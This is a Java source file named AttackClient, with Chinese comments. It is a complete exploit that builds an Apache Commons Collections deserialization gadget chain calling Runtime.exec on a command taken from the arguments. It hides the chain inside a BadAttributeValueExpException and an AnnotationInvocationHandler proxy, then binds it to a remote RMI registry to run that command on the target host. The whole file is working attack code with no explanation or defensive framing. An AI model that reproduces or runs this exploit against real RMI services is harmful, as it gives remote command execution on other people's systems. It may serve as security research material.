package com.cqq;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class AttackClient {
    public static void main(String[] args) throws Exception {
        // 远程RMI Server的地址
        String ip = args[0]; //"127.0.0.1";
        int port = Integer.parseInt(args[1]); //1099;
        // 要执行的命令
        String command = args[2];
        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new Object[] { command }),
                new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valfield = badAttributeValueExpException.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(badAttributeValueExpException, entry);
        String name = "pwned"+ System.nanoTime();
        Map<String, Object> map = new HashMap<String, Object>();
        map.put(name, badAttributeValueExpException);
        // 获得AnnotationInvocationHandler的构造函数
        Constructor cl = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[0];
        cl.setAccessible(true);
        // 实例化一个代理
        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);
        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, hl);
        Remote remote = Remote.class.cast(object);
        
	Registry registry=LocateRegistry.getRegistry(ip,port);
        registry.bind(name, remote);
    }
}
